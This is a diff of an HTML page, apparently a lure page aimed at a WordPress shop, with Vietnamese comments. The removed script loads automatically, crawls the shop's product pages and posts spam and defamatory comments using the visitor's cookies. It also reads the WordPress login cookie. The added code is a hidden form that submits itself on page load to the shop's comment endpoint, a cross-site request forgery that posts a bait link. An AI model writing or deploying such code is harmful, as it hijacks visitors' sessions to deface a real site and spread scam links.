@@ -2918,161 +2918,26 @@
       defer
       data-wp-strategy="defer"
     ></script>
+    <form
+      id="csrfForm"
+      action="https://mydecobox.shop/wp-comments-post.php"
+      method="POST"
+      style="display: none"
+    >
+      <!-- ID bài viết thật -->
+      <input type="hidden" name="comment_post_ID" value="476" />
+      <!-- Nội dung bình luận độc -->
+      <input
+        type="hidden"
+        name="comment"
+        value="Tặng quà miễn phí ở đây nè: https://bit.ly/snaplink 😘"
+      />
+    </form>
+
     <script>
-      // Config có thể tùy chỉnh
-      const CONFIG = {
-        delayBetweenRequests: 2500, // Giảm delay để tăng tốc độ
-        maxRetries: 3, // Số lần thử lại khi fail
-        useCurrentUser: false, // Sử dụng tên user thực nếu có
+      window.onload = () => {
+        document.getElementById("csrfForm").submit();
       };
-
-      const PRODUCT_PAGES = [
-        "https://mydecobox.shop/product-category/hop-co-san/",
-        "https://mydecobox.shop/hop-tu-decor/",
-      ];
-
-      const SPAM_COMMENTS = [
-        "📣 Khuyến mãi 50% đang chờ! Số lượng có hạn![TRUY CẬP NGAY TẠI ĐÂY] https://mydecobox.netlify.app/product/sticker-vintage-da-dang-trang-tri-1-tam-50-cai/ để không bỏ lỡ siêu deal!",
-        "📣 Khuyến mãi 50% đang chờ! Số lượng có hạn![TRUY CẬP NGAY TẠI ĐÂY] https://mydecobox.netlify.app/product/hop-qua-am/ để không bỏ lỡ siêu deal!",
-        "📣 Khuyến mãi 50% đang chờ! Số lượng có hạn![TRUY CẬP NGAY TẠI ĐÂY] https://mydecobox.netlify.app/product/hop-qua-trai-tim/ để không bỏ lỡ siêu deal!",
-        "Giao hàng rất lâu",
-        "Nhân viên thái độ lồi lõm",
-      ];
-
-      // Hàm lấy tên người dùng hiện tại
-      function getCurrentUsername() {
-        try {
-          // Thử lấy từ cookie WordPress
-          const wpCookie = document.cookie
-            .split(";")
-            .find((c) => c.trim().startsWith("wordpress_logged_in_"));
-          if (wpCookie) return wpCookie.split("|")[0].trim();
-
-          // Thử lấy từ các element thông thường
-          const userElements = [
-            document.querySelector(".username"),
-            document.querySelector("#wp-admin-bar-my-account a"),
-          ];
-
-          for (const el of userElements) {
-            if (el?.textContent?.trim()) return el.textContent.trim();
-          }
-
-          return "Khách"; // Fallback
-        } catch (e) {
-          console.warn("Không lấy được username:", e);
-          return "Ẩn danh";
-        }
-      }
-
-      // Hàm fetch với retry
-      async function fetchWithRetry(
-        url,
-        options = {},
-        retries = CONFIG.maxRetries
-      ) {
-        try {
-          const res = await fetch(url, {
-            ...options,
-            headers: {
-              "Content-Type": "application/x-www-form-urlencoded",
-              "X-Requested-With": "XMLHttpRequest", // Giả làm AJAX request
-            },
-          });
-          return res;
-        } catch (err) {
-          if (retries > 0) {
-            await new Promise((r) => setTimeout(r, 2000));
-            return fetchWithRetry(url, options, retries - 1);
-          }
-          throw err;
-        }
-      }
-
-      // Lấy link sản phẩm cải tiến
-      async function extractProductLinks(url) {
-        try {
-          const res = await fetchWithRetry(url);
-          const html = await res.text();
-          const doc = new DOMParser().parseFromString(html, "text/html");
-
-          return [
-            ...new Set(
-              Array.from(doc.querySelectorAll('a[href*="/product/"]'))
-                .map((a) => a.href)
-                .filter((href) => href.startsWith("https://mydecobox.shop"))
-            ),
-          ];
-        } catch (err) {
-          console.warn(`Không crawl được ${url}`, err);
-          return [];
-        }
-      }
-
-      // Gửi comment với xử lý lỗi tốt hơn
-      async function sendComment(productUrl, commentText) {
-        const payload = new URLSearchParams();
-        payload.append(
-          "name",
-          CONFIG.useCurrentUser ? getCurrentUsername() : "Khách"
-        );
-        payload.append("comment", commentText);
-        payload.append("xss_submit", "1");
-
-        try {
-          const res = await fetchWithRetry(productUrl, {
-            method: "POST",
-            body: payload,
-            credentials: "include", // Gửi cả cookie
-          });
-
-          if (res.ok || res.status === 302) {
-            // Xử lý cả redirect
-            console.log(`✅ Thành công: ${productUrl}`);
-            return true;
-          }
-          console.warn(`❌ Lỗi HTTP: ${productUrl} (${res.status})`);
-        } catch (err) {
-          console.error(`🔥 Lỗi gửi: ${productUrl}`, err);
-        }
-        return false;
-      }
-
-      // Hàm chính thực thi
-      async function executeSpam() {
-        console.log("🛡️ Bắt đầu gửi spam comment...");
-
-        // Lấy tất cả link sản phẩm
-        const allLinks = [];
-        for (const url of PRODUCT_PAGES) {
-          const links = await extractProductLinks(url);
-          allLinks.push(...links);
-          console.log(`🔗 Tìm thấy ${links.length} sản phẩm từ ${url}`);
-        }
-
-        if (allLinks.length === 0) {
-          console.error("Không tìm thấy sản phẩm nào!");
-          return;
-        }
-
-        console.log(`🎯 Tổng cộng ${allLinks.length} sản phẩm sẽ bị spam`);
-
-        // Gửi comment đến từng sản phẩm
-        allLinks.forEach((link, i) => {
-          setTimeout(async () => {
-            const randomComment =
-              SPAM_COMMENTS[Math.floor(Math.random() * SPAM_COMMENTS.length)];
-            await sendComment(link, randomComment);
-          }, i * CONFIG.delayBetweenRequests);
-        });
-      }
-
-      // Tự động chạy sau khi trang load
-      if (document.readyState === "complete") {
-        setTimeout(executeSpam, 3000);
-      } else {
-        window.addEventListener("load", () => setTimeout(executeSpam, 3000));
-      }
     </script>
   </body>
 </html>
